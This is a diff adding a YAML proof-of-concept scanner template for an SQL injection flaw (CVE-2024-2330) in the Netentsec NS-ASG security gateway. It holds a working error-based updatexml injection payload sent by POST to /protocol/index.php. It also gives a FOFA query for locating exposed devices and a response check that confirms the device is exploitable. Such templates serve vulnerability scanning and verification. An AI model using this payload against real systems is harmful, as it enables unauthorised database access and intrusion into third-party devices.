@@ -1,0 +1,27 @@
+id: poc-yaml-netent-ns-asg-index-php-sqli
+info:
+  name: 网康NS-ASG应用安全网关 index.php SQL注入漏洞(CVE-2024-2330)
+  severity: high
+  tags:
+  - CVE-2024-2330
+  - SQL注入
+  finger: ns-asg
+  fofa: title="网康-NS-ASG-应用安全网关"
+variables:
+  t1: random_int(1000,9999)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /protocol/index.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: jsoncontent={"protocolType":"addmacbind","messagecontent":["{\"BandIPMacId\":\"1\",\"IPAddr\":\"eth0'and(updatexml(1,concat(0x7e,(select
+    md5({{.t1}}))),1))='\",\"MacAddr\":\"\",\"DestIP\":\"\",\"DestMask\":\"255.255.255.0\",\"Description\":\"Sample+Description\"}"]}
+  expression: 'status_code == 200 &&
+
+    contains(body,substr(t2,0,31)) &&
+
+    contains(body,"XPATH syntax error")
+
+    '
+transport: http
